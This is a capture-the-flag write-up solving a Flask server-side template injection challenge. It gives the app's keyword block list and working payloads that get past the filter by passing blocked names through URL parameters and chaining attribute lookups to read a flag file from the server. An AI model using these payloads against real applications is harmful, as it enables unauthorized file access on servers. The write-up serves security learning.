## Challenge

My friend got highest mark with this challenge, can you beat it :>
http://chall.v1t.site:30300/

## Solution

From the source code, I got to know the blocked strings

```bash
BLOCKED_LITERALS = [
      '{', '}', '__', 'open', 'os', 'subprocess', 'import', 'eval', 'exec',
      'system', 'popen', 'builtins', 'globals', 'locals', 'getattr', 'setattr',
      'class', 'compile', 'inspect'
    ]
```

I started by giving the payload `%7B%7B 7*7 %7D%7D` to confirm SSTI

<img width="1331" height="817" alt="image" src="https://github.com/user-attachments/assets/3b5c7259-6bc1-484b-85e3-0482ad0ed097" />

Then I checked `config`, which is a global object in Flask containing app settings

Payload: `%7B%7B config %7D%7D`

<img width="1323" height="816" alt="image" src="https://github.com/user-attachments/assets/700e4070-b226-4626-b18e-ad3384eb415a" />

The flag wasn't there. Further I decided to read the files, but `globals`, `builtins` and `open` were blocked. So to bypass the filter, I appended `?x=__globals__` to the URL since the filter only checks what's in the textarea and not what comes from URL parameters

Payload: `%7B%7B lipsum|attr(request.values.x) %7D%7D`
URL: `?x=__globals__`

<img width="1578" height="965" alt="image" src="https://github.com/user-attachments/assets/4a5a4167-f46d-4fbb-8548-6bb14fbfd656" />

And that gave me access to `globals`. Now `[]`  were blocked too so I used `.get()` method and chain multiple `|attr()` calls

Payload: `%7B%7B lipsum|attr(request.values.g)|attr(request.values.ge)(request.values.b)|attr(request.values.ge)(request.values.o)(request.values.f)|attr(request.values.r)() %7D%7D`
URL: `?g=__globals__&ge=get&b=__builtins__&o=open&f=/flag.txt&r=read`

I tried multiple common flag paths and finally found the flag in `/app/flag.txt`

<img width="1528" height="931" alt="image" src="https://github.com/user-attachments/assets/048f32fe-fe73-4b92-afee-3e7d4f2136aa" />

Flag: `v1t{n0th1ng_b34ts_url_ssti_9cfac8e6b8978e3f6037d9608fed7767}`

